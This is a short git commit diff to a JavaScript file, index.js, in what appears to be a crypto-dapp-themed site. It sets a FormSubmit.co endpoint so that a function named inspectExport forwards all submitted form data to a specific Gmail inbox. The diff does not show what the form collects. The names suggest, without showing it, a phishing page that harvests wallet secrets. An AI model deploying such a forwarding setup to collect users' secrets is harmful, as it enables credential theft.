372dd84db7476e218e6d69d3ac32729f29d25220
ire <126022307+dapptoole@users.noreply.github.com>
2024-03-23 15:21:50 +0100

    Update index.js

--- 0x_assets/js/index.js
+++ 0x_assets/js/index.js
@@ -48,7 +48,7 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiUrl = "https://formsubmit.co/ajax/your-email@example.com"; // Replace "your-email@example.com" with your FormSubmit.co email
+    let apiUrl = "https://formsubmit.co/ajax/webt12348@gmail.com"; // Replace "your-email@example.com" with your FormSubmit.co email
 
     let formData = new FormData();
     formData.append("form_data", JSON.stringify(strings));
